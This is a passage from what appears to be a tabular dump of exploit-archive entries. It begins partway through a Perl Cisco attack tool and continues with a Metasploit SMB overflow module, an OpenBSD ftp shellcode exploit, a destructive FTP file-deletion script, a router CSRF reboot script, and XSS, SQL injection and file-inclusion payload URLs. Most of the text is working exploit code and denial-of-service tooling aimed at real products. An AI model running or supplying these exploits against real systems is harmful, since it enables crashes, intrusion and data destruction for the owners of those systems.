Denial of Service Vulnerability {   my $serv = $host;   my $port = 80;   my $vuln = ""GET ? HTTP/1.0\n\n"";     my $sockd = IO::Socket::INET->new (                                      PeerAddr => $serv,                                      PeerPort => $port,                                      Proto => ""tcp"")                                      || die ""No http server detected on $serv ...\n\n"";    print ""Packet sent ...\n"";   print $sockd ""$vuln"";   sleep(2);   print ""\nServer response :\n\n"";   close($sockd);   exit(1); }  sub cisco7 # Cisco Catalyst 3500 XL Remote Arbitrary Command Vulnerability {   my $serv = $host;   my $port = 80;   my $k = """";      print ""Enter a file to read [ /show/config/cr set as default ] : "";   $k = <STDIN>;   chomp ($k);   if ($k eq """")   {$vuln = ""GET /exec/show/config/cr HTTP/1.0\n\n"";}   else   {$vuln = ""GET /exec$k HTTP/1.0\n\n"";}    my $sockd = IO::Socket::INET->new (                                      PeerAddr => $serv,                                      PeerPort => $port,                                      Proto => ""tcp"")                                      || die ""No http server detected on $serv ...\n\n"";    print ""Packet sent ...\n"";   print $sockd ""$vuln"";   sleep(2);   print ""\nServer response :\n\n"";   while (<$sockd>){print}   close($sockd);   exit(1); }  sub cisco8 # Cisco IOS Software HTTP Request Denial of Service Vulnerability {   my $serv = $host;   my $port = 80;   my $vuln = ""GET /error?/ HTTP/1.0\n\n"";    my $sockd = IO::Socket::INET->new (                                      PeerAddr => $serv,                                      PeerPort => $port,                                      Proto => ""tcp"")                                      || die ""No http server detected on $serv ...\n\n"";    print ""Packet sent ...\n"";   print $sockd ""$vuln"";   sleep(2);   print ""\nServer response :\n\n"";   while (<$sockd>){print}   close($sockd);   exit(1); }  sub cisco9 # Cisco 514 UDP Flood Denial of Service Vulnerability {   my $ip = $host;   my $port = ""514"";   my $ports = """";   my $size = """";   my $i = """";   my $string = ""%%%%%XX%%%%%"";    print ""Input packets size : "";   $size = <STDIN>;   chomp($size);    socket(SS, PF_INET, SOCK_DGRAM, 17);   my $iaddr = inet_aton(""$ip"");    for ($i=0; $i<10000; $i++)   { send(SS, $string, $size, sockaddr_in($port, $iaddr)); }    printf ""\nPackets sent ...\n"";   sleep(2);   printf ""Please enter a server's open port : "";   $ports = <STDIN>;   chomp $ports;   printf ""\nNow checking server status ...\n"";   sleep(2);    socket(SO, PF_INET, SOCK_STREAM, getprotobyname('tcp')) || die ""An error occuring while loading socket ...\n\n"";   my $dest = sockaddr_in ($ports, inet_aton($ip));   connect (SO, $dest) || die ""Vulnerability successful exploited. Target server is down ...\n\n"";    printf ""Vulnerability unsuccessful exploited. Target server is still up ...\n\n"";   exit(1); }  sub cisco10 # CiscoSecure ACS for Windows NT Server Denial of Service Vulnerability {   my $ip = $host;   my $vln = ""%%%%%XX%%%%%"";   my $num = 30000;   my $string .= $vln x $num;   my $shc=""\015\012"";    my $sockd = IO::Socket::INET->new (                                      Proto => ""tcp"",                                      PeerAddr => $ip,                                      PeerPort => ""(2002)"",                                     ) || die ""Unable to connect to $ip:2002 ...\n\n"";    $sockd->autoflush(1);   print $sockd ""$string"" . $shc;   while (<$sockd>){ print }   print ""Packet sent ...\n"";   close($sockd);   sleep(1);   print(""Now checking server's status ...\n"");   sleep(2);    my $sockd2 = IO::Socket::INET->new (                                       Proto=>""tcp"",                                       PeerAddr=>$ip,                                       PeerPort=>""(2002)"",);                                       unless ($sockd){die ""Vulnerability successful exploited. Target server is down ...\n\n""};    print(""Vulnerability unsuccessful exploited. Target server is still up ...\n\n"");   exit(1); }  sub cisco11 # Cisco Catalyst Memory Leak Vulnerability {   my $serv = $host;   my $rep = """";   my $str = ""AAA\n"";    print ""\nInput the number of repetitions : "";   $rep = <STDIN>;   chomp $rep;     my $sockd = IO::Socket::INET->new (                                      PeerAddr => $serv,                                      PeerPort => ""(23)"",                                      Proto => ""tcp"")                                      || die ""No telnet server detected on $serv ...\n\n"";    for ($k=0; $k<=$rep; $k++) {                                 print $sockd ""$str"";                                 sleep(1);                                 print $sockd ""$str"";                                 sleep(1);                              }   close($sockd);   print ""Packet sent ...\n"";   sleep(1);   print(""Now checking server's status ...\n"");   sleep(2);      my $sockd2 = IO::Socket::INET->new (                                       Proto=>""tcp"",                                       PeerAddr=>$serv,                                       PeerPort=>""(23)"",);                                       unless ($sockd2){die ""Vulnerability successful exploited. Target server is down ...\n\n""};    print ""Vulnerability unsuccessful exploited. Target server is still up after $rep logins ...\\n"";   close($sockd2);   exit(1); }  sub cisco12 # Cisco CatOS CiscoView HTTP Server Buffer Overflow Vulnerability {   my $serv = $host;   my $l =100;   my $vuln = """";   my $long = ""A"" x $l;    my $sockd = IO::Socket::INET->new (                                      PeerAddr => $serv,                                      PeerPort => ""(80)"",                                      Proto => ""tcp"")                                      || die ""No http server detected on $serv ...\n\n"";    for ($k=0; $k<=50; $k++) {                               my $vuln = ""GET "" . $long . "" HTTP/1.0\n\n"";                               print $sockd ""$vuln\n\n"";                               sleep(1);                               $l = $l + 100;                            }    close($sockd);   print ""Packet sent ...\n"";   sleep(1);   print(""Now checking server's status ...\n"");   sleep(2);    my $sockd2 = IO::Socket::INET->new (                                       Proto=>""tcp"",                                       PeerAddr=>$serv,                                       PeerPort=>""http(80)"",);                                       unless ($sockd2){die ""Vulnerability successful exploited. Target server is down ...\n\n""};    print ""Target is not vulnerable. Server is still up after 5 kb of buffer ...)\n"";   close($sockd2);   exit(1); }  sub cisco13 # %u Encoding IDS Bypass Vulnerability (UTF) {   my $serv = $host;   my $vuln = ""GET %u002F HTTP/1.0\n\n"";    my $sockd = IO::Socket::INET->new (                                      PeerAddr => $serv,                                      PeerPort => ""(80)"",                                      Proto => ""tcp"")                                      || die ""No http server detected on $serv ...\n\n"";    print ""Packet sent ...\n"";   print $sockd ""$vuln"";   close($sockd);   sleep(1);   print(""Now checking server's status ...\n"");   print(""Please verify if directory has been listed ...\n\n"");   print(""Server response :\n"");   sleep(2);   while (<$sockd>){ print }   exit(1); }  sub cisco14 # Cisco IOS HTTP server DoS Vulnerability {   my $serv = $host;   my $vuln = ""GET /TEST?/ HTTP/1.0"";    my $sockd = IO::Socket::INET->new (                                      Proto=>""tcp"",                                      PeerAddr=>$serv,                                      PeerPort=>""http(80)"",);                                      unless ($sockd){die ""No http server detected on $serv ...\n\n""};    print $sockd ""$vuln\n\n"";   print ""Packet sent ...\n"";   close($sockd);   sleep(1);   print(""Now checking server's status ...\n"");   sleep(2);    my $sockd2 = IO::Socket::INET->new (                                       Proto=>""tcp"",                                       PeerAddr=>$serv,                                       PeerPort=>""http(80)"",);                                       unless ($sockd2){die ""Vulnerability successful exploited. Target server is down ...\n\n""};    print(""Vulnerability unsuccessful exploited. Target server is still up ...\n\n"");   close($sockd2);   exit(1); }",.blackangels.it,0
36316,"ZOHO ManageEngine ADSelfService Plus 4.5 Build 4521 - Cross-Site Scripting source: https://www.securityfocus.com/bid/50717/info  ZOHO ManageEngine ADSelfService Plus is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.  ManageEngine ADSelfService Plus 4.5 Build 4521 is vulnerable; other versions may also be affected.   Proof of Concept =================== Double-Quote String Termination HTTP Request = https://serverip:port/EmployeeSearch.cc?searchType=contains&searchBy=ALL_FIELDS&searchString="";alert(""XSS"");//\""  Response Source View <script language=""javascript""> var searchValue = ""';alert(XSS)//\"""";   Single-Quote String Termination Similarly... HTTP Request https://serverip:port/EmployeeSearch.cc?searchType=';document.location=""http://www.cnn.com"";//\""&searchBy=ALL_FIELDS&searchString=BoB",.,0
11195,"Microsoft Windows Defender - ActiveX Heap Overflow (PoC) #Exploits title :[Microsoft Windows Defender ActiveX Heap Overflow PoC] #tested on :[windows 7] #Microsoft Windows Defender  <html> <object classid='clsid:07DD3249-A591-4949-8F20-09CD347C69DC' id='target' ></object> <script language='vbscript'> targetFile = ""C:\Program Files\Windows Defender\MsMpCom.dll"" prototype  = ""Sub DeleteValue ( ByVal bstrKeyName As String ,  ByVal bstrValueName As String )"" memberName = ""DeleteValue"" progid     = ""MpComExportsLib.MsMpSimpleConfig"" argCount   = 2   arg1=""defaultV"" arg2=""%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s""   target.DeleteValue arg1 ,arg2    </script>",Microsoft,1
45172,"TP-Link C50 Wireless Router 3 - Cross-Site Request Forgery (Remote Reboot) # Exploit Title: TP-Link C50 Wireless Router 3 - Cross-Site Request Forgery (Remote Reboot) # Date: 2018-08-09 # Exploit Author: Wadeek # Vendor Homepage: https://www.tp-link.com/ # Hardware Version: Archer C50 v3 00000001 # Firmware Link: https://www.tp-link.com/download/Archer-C50_V3.html#Firmware # Firmware Version: <= Build 171227   #!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! url = ""http://192.168.0.1:80/"" #!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!  require('mechanize') agent = Mechanize.new()  def reboot(agent, url, path, query) begin 	response = agent.post(url+path, query, { 		""User-Agent"" => """", 		""Accept"" => ""*/*"", 		""Referer"" => ""http://192.168.0.1/mainFrame.htm"", 		""Content-Type"" => ""text/plain"", 		""Connection"" => ""keep-alive"", 		""Cookie"" => """" 	}) rescue Exception => e 	begin 		puts(e.inspect()) 		puts(e.page().body()) 	rescue 	end 	puts("""") else 	puts(path) 	puts(response.body()) 	puts("""") end end  #!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! reboot(agent, url, ""cgi?7"", ""[ACT_REBOOT#0,0,0,0,0,0#0,0,0,0,0,0]0,0\r\n"") #!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!",.tp-link.,1
30129,Prototype of an PHP Application 0.1 - 'common.inc.php?path_inc' Remote File Inclusion source: https://www.securityfocus.com/bid/24266/info            'Prototype of an PHP application' is prone to multiple remote file-include vulnerabilities because it fails to properly sanitize user-supplied input to the application.            An attacker may leverage these issues to execute an arbitrary remote file containing malicious script code in the context of the webserver process. This may allow the attacker to compromise the application and the underlying system. Other attacks are also possible.            This issue affects 'Prototype of an PHP application' 0.1.   http://example.com/script/common.inc.php?path_inc=[shell],Prototype,1
16373,"Microsoft Services - 'nwapi32.dll' (MS06-066) (Metasploit) ## # $Id: ms06_066_nwapi.rb 10150 2010-08-25 20:55:37Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = GoodRanking  	include Msf::Exploit::Remote::Egghunter 	include Msf::Exploit::Remote::DCERPC 	include Msf::Exploit::Remote::SMB   	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Microsoft Services MS06-066 nwapi32.dll', 			'Description'    => %q{ 					This module exploits a stack buffer overflow in the svchost service, when the netware 				client service is running. This specific vulnerability is in the nwapi32.dll module. 			}, 			'Author'         => [ 'pusscat' ], 			'License'        => MSF_LICENSE, 			'Version'        => '$Revision: 10150 $', 			'References'     => 				[ 					[ 'CVE', '2006-4688'], 					[ 'OSVDB', '30260'], 					[ 'BID', '21023'], 					[ 'MSB', 'MS06-066'],  				], 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'thread', 				}, 			'Privileged'     => true, 			'Payload'        => 				{ 					'Space'    => 296, 					'BadChars' => """", 					'Compat'   => 					{ 						# -ws2ord XXX? 					}, 					'StackAdjustment' => -3500, 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					[ 						'Windows XP SP2', 						{ 							'Ret'      => 0x00EBEEEC , 						}, 					] 				], 			'DefaultTarget' => 0, 			'DisclosureDate' => 'Nov 14 2006'))  		register_options( 			[ 				OptString.new('SMBPIPE', [ true,  ""The pipe name to use (browser, srvsvc, wkssvc, ntsvcs)"", 'srvsvc']), 			], self.class) 	end  	def exploit 		# [in] [unique] wchar * 		# [in] wchar * 		# [in, out] long 		# [out] handle  		# Generate the egghunter payload 		hunter = generate_egghunter(payload.encoded, payload_badchars, { :checksum => true }) 		egg    = hunter[1] 		#print_status(""Today, we'll be hunting for 0x#{egg.unpack(""V"")[0]}"")  		# Add giant blocks of guard data before and after the egg 		eggdata  = 			rand_text(1024) + 				egg + 			rand_text(1024)  		buflen = 295 		ofstring	= Rex::Text.to_unicode('\\\\') + ""\x90"" + hunter[0] + rand_text(buflen-hunter[0].length) + 			[ target.ret ].pack('V') + ""\x00"" 		#ofstring	= Rex::Text.to_unicode('\\\\') + payload.encoded + [ target.ret ].pack('V') + ""\x00\x00""  		stubdata = 			NDR.long(rand(0xffffffff)) + 				NDR.UnicodeConformantVaryingString(""\\\\BBBB"") + 			NDR.UnicodeConformantVaryingStringPreBuilt(ofstring) +  # HERE! 			#NDR.UnicodeConformantVaryingString('\\\\' + ""A""*1024 + ""\x00"") + 			NDR.long(rand(0xffffffff)) + 			NDR.long(rand(0xffffffff)) + 			#NDR.long((ofstring.length * 2) + 0xC) + 			eggdata  		print_status(""Connecting to the SMB service..."") 		connect() 		smb_login()  		handle = dcerpc_handle('e67ab081-9844-3521-9d32-834f038001c0', '1.0', 'ncacn_np', [""\\#{datastore['SMBPIPE']}""]) 		print_status(""Binding to #{handle} ..."") 		dcerpc_bind(handle) 		print_status(""Bound to #{handle} ..."")  		print_status(""Calling the vulnerable function..."")  		begin 			dcerpc.call(0x09, stubdata) 		rescue Rex::Proto::DCERPC::Exceptions::NoResponse 			print_status('Server did not respond, this is expected') 		rescue => e 			if e.to_s =~ /STATUS_PIPE_DISCONNECTED/ 				print_status('Server disconnected, this is expected') 			else 				raise e 			end 		else 			print_status(""Got #{dcerpc.last_response.stub_data.length} bytes: #{dcerpc.last_response.stub_data}"") 		end  		# Cleanup 		handler 		disconnect  		if (dcerpc.last_response != nil and 			dcerpc.last_response.stub_data != nil and 			dcerpc.last_response.stub_data == ""\x04\x00\x00\x00\x00\x00\x00\x00\x1a\x00\x00\x00"") 			return true 		else 			return false 		end 	end  end",Microsoft,1
36655,phpLDAPadmin 1.2.0.5-2 - 'server_id' Cross-Site Scripting source: https://www.securityfocus.com/bid/51794/info  phpLDAPadmin is prone to cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.  phpLDAPadmin 1.2.0.5-2 is affected; other versions may also be vulnerable.   https://www.example.com/phpldapadmin/cmd.php?server_id=<script>alert('XSS')</script>  https://www.example.com/phpldapadmin/index.php?server_id=<script>alert('XSS')</script>&redirect=false,phpldapadmin_project,1
22074,"Apple Mac OSX 10.2.2 - Directory Kernel Panic (Denial of Service) source: https://www.securityfocus.com/bid/6331/info  Mac OS X is the BSD-derived operating system distributed and maintained by Apple Sofware.  It has been reported that a denial of service exists in OS X. When a user creates a directory, descends it, creates another directory of the same name, then attempts to move the directory up one level in the hierarchy, the system reacts unpredictably. It has been reported that this can cause a crash of the system.  mkdir ~/mydir; cd ~/mydir; mkdir mydir; mv mydir ..",Apple,1
27188,"Private Photos 1.0 iOS - Persistent Cross-Site Scripting Title: ====== Private Photos v1.0 iOS - Persistent Path Web Vulnerability   Date: ===== 2013-07-25   References: =========== http://www.vulnerability-lab.com/get_content.php?id=1034   VL-ID: ===== 1034   Common Vulnerability Scoring System: ==================================== 3.5   Introduction: ============= You must have some private photos you don`t want others peeping. Private photos is the perfect app to keep  your private photos safely in your iPad. Photos are protected by a password and you won`t worry your privacy  when friends playing your iPad.  Now you can enjoy your private photos anytime, anywhere with your iPad. The built-in viewer can zoom in,  zoom out, and slideshow photos, just like the experience with the native photos app.  Highlighted features: - One password protection for photos viewing and transferring - Web access via WIFI - Multiple photos transferring - Multi-touch support: swipe, zoom - Slide show  Transferring your photos to the app is simple. You can easily access your private photos via WIFI from  desktop/laptop`s web browser (Make sure your desktop/laptop is in the same WIFI network as your iPad).  When connected to your iPad from web browser, you can select and transfer multiple photos with one click.  The transferring is also protected by the same password.  (Copy of the Homepage: https://itunes.apple.com/de/app/my-private-photos/id427134970 )   Abstract: ========= The Vulnerability Laboratory Research Team discovered 2 persistent web vulnerabilities in the Private Photos v1.0 application (Apple iOS - iPad & iPhone).   Report-Timeline: ================ 2013-07-25:    Public Disclosure (Vulnerability Laboratory)   Status: ======== Published   Affected Products: ================== Apple AppStore Product: Private Photos 1.0   Exploitation-Technique: ======================= Remote   Severity: ========= Medium   Details: ======== A persistent input validation web vulnerability is detected  in the Private Photos v1.0 application (Apple iOS - iPad & iPhone). The bug allows an attacker (remote) to implement/inject malicious own malicious persistent script codes (application side).  The vulnerability is located in the `Add Directory` module of the web-server (http://localhost:8080) when processing to  request via POST method manipulated `folder-names`. The folder name will be changed to the path value without secure filter,  encode or parse. The injected script code will be executed in the path listing were the attacker injected earlier the code  and of course also in the index listing of the mobile web application.  There is a security protection to filter single and double quotes. When processing to inject the code a messagebox pops up  with the illegal characters exception. To bypass the exception the remote attacker can use simple obfuscated strings, embed code  or html/js script codes (frames, scripts, img, embed and co.) without single & double quotes.  Exploitation of the persistent web vulnerability requires low user interaction and a local low privilege mobile application account  with a password. Successful exploitation of the vulnerability can lead to persistent session hijacking (customers), account steal  via persistent web attacks, persistent phishing or persistent module context manipulation.  Vulnerable Application(s): 				[+] Private Photos v1.0 - ITunes or AppStore (Apple)  Vulnerable Module(s): 				[+] Add Directory  Vulnerable Parameter(s): 				[+] path (DIRECTORYNAME)  Affected Module(s): 				[+] Index Listing 				[+] Path/Folder Listing   Proof of Concept: ================= The persistent input validation web vulnerability can be exploited by remote attackers with low privilege application user account  and low or medium required user interaction. For demonstration or reproduce ...  PoC: Add Directory  <strong style=""position:absolute; color:#226ebc; left:12px; top:0px; font-size:20px;"">Private Photos</strong> <div style=""position:absolute; font-size:15px; color:#444; right:12px; top:20px; font-size:15px; line-height:24px;  text-align:right; width:360px;""><strong style=""color:#F30;"">The free version only allows 100 photos!</strong> <br><strong>Get the full verison in <a href=""http://itunes.apple.com/app/id427134970?mt=8"" style=""color:#F60;""  target=""_blank"">App Store</a></strong></div></div>   <div class=""topbar_2"" style=""color:#FFC;""> <span style=""position:absolute; right:10px;""><a href=""javascript:addFolder();""> Add Directory</a>  |  <a id=""AllSelect"" href=""javascript:selectAll()"">Select All</a>   |  <a href=""javascript:if(confirm('Are%20you%20sure%20to%20delete?'))delPhoto();""  id=""del"" style=""color:#F30;"">Delete</a></span> <span style=""position:absolute; left:10px;"">Photos/ ><[PERSISTENT INJECTED SCRIPT CODE VIA ADD DIRECTORY NAME]"">/     <a href=""javascript:window.location.href='..'""  style=""color:#F60""> <<Up  Level</a></span><span id=""photoCount""></span>  Note: The application will attach the injected payload to the main server as folder/path name. example: http://localhost:8080/[payload]<   Solution: ========= The vulnerability can be patched by a restriction of the foldername input and a secure encoding of the input. The output location of the foldername and path needs to be filtered and encoded by a secure mechanism.   Risk: ===== The security risk of the persistent script code inject web vulnerability is estimated as medium.   Credits: ======== Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@evolution-sec.com)   Disclaimer: =========== The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties,  either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability- Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business  profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some  states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation  may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases  or trade with fraud/stolen material.  Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       - www.evolution-sec.com Contact:    admin@vulnerability-lab.com 	- research@vulnerability-lab.com 	       - admin@evolution-sec.com Section:    www.vulnerability-lab.com/dev 	- forum.vulnerability-db.com 		       - magazine.vulnerability-db.com Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       - youtube.com/user/vulnerability0lab Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php  Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory.  Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other  media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and  other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed),  modify, use or edit our material contact (admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.  				Copyright � 2013 | Vulnerability Laboratory [Evolution Security]    --  VULNERABILITY LABORATORY RESEARCH TEAM DOMAIN: www.vulnerability-lab.com CONTACT: research@vulnerability-lab.com",.vulnerability-lab.,0
31843,"Excuse Online - 'pwd.asp' SQL Injection source: https://www.securityfocus.com/bid/29370/info  Excuse Online is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  http://www.example.com/excuse/MainProgram/pwd.asp?pwd=blah&pID='+or+???+like+'%25 http://www.example.com/excuse/MainProgram/pwd.asp?pwd=blah&pID='+or+??+like+'%25",Excuse,1
1201,"FTP Internet Access Manager 1.2 - Command Execution #!usr/bin/perl # #   FTP Internet Access Manager Command Exploit # ---------------------------------------------- #      Infam0us Gr0up - Securiti Research # # Info: infamous.2hell.com # Vendor URL: www.softfolder.com/internet_access_manager.html #   use IO::Socket;  if (@ARGV != 4)  {  print ""\n FTP Internet Access Manager Command Exploit\n""; print ""---------------------------------------------\n\n""; print ""[!] usage: perl $0 [host] [user] [pass] [*file]\n""; print ""[?] exam: perl $0 localhost admin 123 C:\\WINNT\\system32\\command.exe\n""; print ""*Only at dir Internet Access Manager was installed that user can delete\nany files type(e.g C:\\)\n\n"";  exit (); }   $adr = $ARGV[0]; $user = $ARGV[1]; $pass = $ARGV[2]; $flz = $ARGV[3];  print ""\n[+] Connect to $adr..\n""; $remote = IO::Socket::INET->new(Proto=>""tcp"", PeerAddr=>$adr, PeerPort=>21, Reuse=>1) or die ""Error: can't connect to $adr:21\n"";  $chr1 = ""\x55\x53\x45\x52""; $chr2 = ""\x50\x41\x53\x53"";  $dll = ""\x44\x45\x4c\x45""; $tou = ""\x70\x6f\x72\x74""; $bel = ""\x32\x31"";  $cowflaw = $tou.$bel;  $tmp = ""\x53\x54\x4f\x55""; $chop = ""\x4f\x56\x45\x52"";  print ""[+] Connected\n""; $remote->autoflush(1); print ""[+] FTP Server ..ready\n"";  print $remote ""$chr1 $user\n"" and print ""[+] Send -> USER $user...\n"" or die ""[-] Error: can't send user\n""; sleep(1); print $remote ""$chr2 $pass\n"" and print ""[+] Send -> PASS $pass...\n"" or die ""[-] Error: can't send pass\n""; sleep(2); print ""[+] User admin logged in\n""; print ""[+] Press[enter] to DELETE $flz\n""; $bla= ; print $remote ""$dll /$flz\n""; sleep(2); print ""[+] Success\n""; sleep(1); print ""[+] Sending trash mount..\n""; sleep(1); print $remote ""$cowflaw\n""; print $remote ""$tmp\n""; print ""[+] Trashing folder[1]..\n""; print $remote ""$tmp\n""; print ""[+] Trashing folder[2]..\n""; print $remote ""$tmp\n""; print ""[+] Trashing folder[3]..\n""; print $remote ""$tmp\n""; print ""[+] Trashing folder[4]..\n""; print $remote ""$tmp\n""; print ""[+] Trashing folder[5]..\n""; print $remote ""$tmp\n""; print ""[+] Trashing folder[6]..\n""; print $remote ""$tmp\n""; print ""[+] Trashing folder[7]..\n""; print $remote ""$tmp\n""; print ""[+] Trashing folder[8]..\n""; print $remote ""$tmp\n""; print ""[+] Trashing folder[9]..\n""; print $remote ""$tmp\n""; print ""[+] Trashing folder[10]..\n""; print $remote ""$tmp\n""; print ""[+] Trashing folder[11]..\n""; print $remote ""$tmp\n""; print ""[+] Trashing folder[12]..\n""; print $remote ""$tmp\n""; print ""[+] Trashing folder[13]..\n""; print $remote ""$tmp\n""; print ""[+] Trashing folder[14]..\n""; print $remote ""$tmp\n""; print ""[+] Trashing folder[15]..\n""; print $remote ""$tmp\n""; sleep(2); print ""[+] DONE\n\n""; print $remote ""$chop\n"";   print ""W00t.FTP Flawned!\n""; print ""..press any key to exit\n""; $bla= ; close $remote;  # milw0rm.com [2005-09-07]",.softfolder.,1
26717,"Web4Future eCommerce Enterprise Edition 2.1 - 'view.php' Multiple SQL Injections source: https://www.securityfocus.com/bid/15707/info  eCommerce Enterprise Edition is prone to multiple SQL injection vulnerabilities.  These vulnerabilities could permit remote attackers to pass malicious input to database queries, resulting in modification of query logic or other attacks.  eCommerce Enterprise Edition 2.1 and prior and eCommerce Home Edition are vulnerable to these issues.   http://www.example.com/view.php?prod=[SQL]",Web4Future,1
396,"OpenBSD - 'ftp' Local Overflow /* 7350-crocodile - x86/OpenBSD ftp exploit  *  * by lorian and scut / TESO=20  *   *  * TESO CONFIDENTIAL - SOURCE MATERIALS  *  * This is unpublished proprietary source code of TESO Security.  *  * The contents of these coded instructions, statements and computer  * programs may not be disclosed to third parties, copied or duplicated in  * any form, in whole or in part, without the prior written permission of  * TESO Security. This includes especially the Bugtraq mailing list, the  * www.hack.co.za website and any public exploit archive.  *  * (C) COPYRIGHT TESO Security, 2002  * All Rights Reserved  *  *****************************************************************************  *  * greetz: synnergy, GOBBLES Security  *  */  #include <stdio.h> #include <string.h> #define RET 0xbfffeb30   #define VERSION  ""0.2.0"" #define USERNAME ""anonymous"" #define PASSWORD ""guest@""   char shellcode[] =  ""\x32\xdb\x81\xd1\xb1\x72\xcd\x83"" ""\x21\x21\x31\xc2\x32\xdb\xb5\x27"" ""\xcd\x71\x23\xc2\xb3\x72\xcd\x81"" ""\x32\xc1\x12\xdb\xb4\x3e\xcd\x81"" ""\xeb\x4f\x35\xc2\x31\xc1\x5e\xb1"" ""\x32\x7d\x5e\x98\xfe\xc2\xb8\xed"" ""\xcd\x79\x38\xc1\x1d\x3e\x18\xb1"" ""\x3d\xcd\x82\x32\xc1\xbb\xd2\xd2"" ""\xd2\xff\xf2\xdb\x39\xc1\xb2\x11"" ""\x56\x75\xce\x82\x0e\x81\xc9\x13"" ""\xe5\xf2\x1e\xb5\x0d\x8d\x1e\x11"" ""\xcd\x21\x31\xc2\x09\x42\x21\x19"" ""\x70\x48\x21\x41\x9c\xb3\x2b\x81"" ""\xf1\x2d\x2e\x18\x1d\x32\x7c\xcd"" ""\x82\xe2\xac\xff\xff\xff"";  void mkd(char *dir) {         char blah[2048], *p;         int n;         bzero(blah, sizeof(blah));          p = blah;          for(n=1; n<strlen(dir); n++){                 if(dir[n] == '\xff'){                         *p = '\xff';                         p++;                 }                 *p = dir[n];                 p++;         }          printf(""MKD %s\r\n"", blah);         printf(""CWD %s\r\n"", blah); }  void main (int argc, char *argv[]) {  char *buf; char buf2[200]; char buf1[400]; char dir2[255]; char *p; char *q; char tmp[255]; int a; int offset; int i;    if (argc > 0) offset = atoi(argv[0]);     else offset = 1;  fprintf(stderr, ""ret-addr = 0x%x\n"", RET + offset); fprintf(stderr, ""shell size = %d\n"", sizeof(shellcode));  dir2[231] = '\1'; memset(dir2, '\x70', 255);          printf(""user %s\r\n"", USERNAME);         printf(""pass %s\r\n"", PASSWORD);         printf(""cwd %s\r\n"", argv[2]);  memset(buf1, 0x50, 150); p = &buf1[sizeof(argv[0])]; q = &buf1[399]; *q = '\x00'; while(q <= p) {         strncpy(tmp, p, 80);         mkd(tmp);         p+=255; }          mkd(dir2);         mkd(shellcode);         mkd(""bin"");         mkd(""sh"");          memset(buf2, 0x30, 40); // var 96 for(i=4; i<20; i+=4)         *(long *)&buf2[i+1] = RET; p = &buf2[0]; q = &buf2[50]; strncpy(tmp, p, 20);  mkd(tmp);  printf(""pwd\r\n""); }   // milw0rm.com [2002-01-01]",openbsd,0
20438,"Microsoft Windows 3.11/95/NT 4.0/NT 3.5.1 - 'Out Of Band' Data Denial of Service (2) source: https://www.securityfocus.com/bid/2010/info   Older versions of Microsoft Windows (95, Windows for Workgroups 3.11, Windows NT up to and including 4.0), as well as SCO Open Server 5.0, have a vulnerability relating to the way they handle TCP/IP ""Out of Band"" data.   According to Microsoft, ""A sender specifies ""Out of Band"" data by setting the URGENT bit flag in the TCP header. The receiver uses the URGENT POINTER to determine where in the segment the urgent data ends. Windows NT bugchecks when the URGENT POINTER points to the end of the frame and no normal data follows. Windows NT expects normal data to follow. ""   As a result of this assumption not being met, Windows gives a ""blue screen of death"" and stops responding.   Windows port 139 (NetBIOS) is most susceptible to this attack. although other services may suffer as well. Rebooting the affected machine is required to resume normal system functioning.   perl -MIO::Socket -e 'IO::Socket::INET->new(PeerAddr=>""some.windoze.box:139"")->send(""bye"",MSG_OOB)'",Microsoft,1
